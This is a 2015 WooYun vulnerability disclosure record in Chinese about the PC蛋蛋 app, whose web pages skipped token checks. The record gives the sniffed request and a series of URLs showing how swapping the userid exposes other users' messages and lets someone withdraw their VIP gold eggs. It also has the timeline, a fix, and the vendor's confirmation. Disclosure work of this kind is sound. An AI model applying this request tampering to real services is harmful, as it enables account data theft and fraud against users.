{"id": 45788, "wybug_id": "wooyun-2015-094253", "wybug_title": "PC蛋蛋token审计不严导致可查阅任意账户信息并可提取任意账户VIP金蛋", "wybug_corp": "pceggs.com", "wybug_author": "路人甲", "wybug_date": "2015-01-27 22:22", "wybug_open_date": "2015-03-13 22:24", "wybug_type": "网络未授权访问", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向公众公开  简要描述： 由于PC蛋蛋的App审计不严格而引发的隐私信息泄露。 详细说明：  由于PC蛋蛋的App的Web端对token审计不严格而引发的隐私信息泄露。0x01 准备工作    硬件：iPhone6、Broadcom 802.11n网卡的iMac    工具：sniffer tools    启用承载网络（虚拟AP）： \n\n    下载APP： \n\n    注册登录： \n\n0x02 证明漏洞    sniffer抓一下查看Message的包： \nGET /page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=19118867&token=qigqrsrw8r8pa3bbd7coc7qa5s2atpqtql2caec8&keycode=3B33F47EA87C9B19AE2A1E41E75BBF7 HTTP/1.1Host: app.pceggs.comConnection: keep-aliveAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B436Accept-Language: zh-cnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n    地址放到Chrome里访问下： \n\n    http://app.pceggs.com/page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=19118867&token=qigqrsrw8r8pa3bbd7coc7qa5s2atpqtql2caec8&keycode=3B33F47EA87C9B19AE2A1E41E75BBF7    发现是可以访问的，那就是token和keycode起到了作用？OK，我们逐个参数去掉测试一下。    去掉keycode参数： \n\n     http://app.pceggs.com/page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=19118867&token=qigqrsrw8r8pa3bbd7coc7qa5s2atpqtql2caec8    发现可以访问，那么难道只检查了token？我们把token去掉看看    去掉token参数： \n\n    http://app.pceggs.com/page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=19118867    见证奇迹的时刻，居然还可以访问！！难道就没有校验token？？赶快换个userid试试！    1003的userid试试： \n\n    http://app.pceggs.com/page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=1003    奇迹出现了，居然……     那其他页面存在这种问题吗？赶快看看……    个人中心： \n\n    http://app.pceggs.com/page/myeggs/app_myeggs.aspx?t=1&v=2.0.6&userid=17789037    无验证token查看VIP金蛋： \n\n     提取金蛋： \n\n    提取金蛋成功： \n\n    http://app.pceggs.com/page/myeggs/app_vip.aspx?type=1&t=1&v=2.0.6&userid=17789037    还有其他页面不罗列了，都是同样的问题。   漏洞证明：   \n\n    http://app.pceggs.com/page/myeggs/app_message.aspx?t=1&v=2.0.6&userid=1004   修复方案：  校验一下token及keycode完整性   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-01-28 17:57 厂商回复： 感谢对PC蛋蛋安全的关注，已修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-27 22:27 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  蛋蛋的悲伤    \n     2015-01-27 22:30 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  洞主还我蛋蛋    \n     2015-01-27 22:33 |    \t\twifi \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:2        | 这厮真懒……)\t\t \n  据说蹦蹦APP也存在校验不严格的问题    \n     2015-02-18 08:29 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @wifi 蹦蹦客服那个叫啥君的态度很不好……    \n     2015-03-21 14:06 |    \t\twifi \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:2        | 这厮真懒……)\t\t \n  @小龙 暴利之下土豪多，土豪一般脾气都不太好    \n     2015-03-21 19:14 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @wifi 建议你去检测下。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}